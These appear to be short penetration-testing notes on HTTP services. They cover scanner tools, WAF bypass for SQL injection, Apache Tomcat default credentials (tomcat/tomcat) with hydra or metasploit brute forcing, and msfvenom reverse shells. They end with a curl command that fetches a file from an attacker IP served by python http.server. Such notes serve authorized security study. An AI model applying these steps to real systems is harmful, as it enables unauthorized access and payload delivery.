Hyper Text Transfer Protocol

It is a communication language which uses between client and server.
It is a set of rules or protocol used for communication between client and server.

Always run nikto , nuceli and nessus tool for http and https services.

Port: 80 (http), 443 (https)

version: 1.1, 2.0

## WAF
Web Application Firewall
When found WAF, we then need to use the WAF bypass payload.
Report vuln: SQL injection - WAF bypass



Apache Tomcat 5.5 default credentials (tomcat, tomcat)

Apache uses .war file type

Can brute force the default credentials using hydra or metasploit module (http_login).


Use msf venom for reverse shell script creation.

Use this command on windows to make server
```
python -m http.server
```

it default runs on port 8000

```
curl <Attacker IP>/<Attacker Port>/<filename_to_download> -o <name_to_set>
```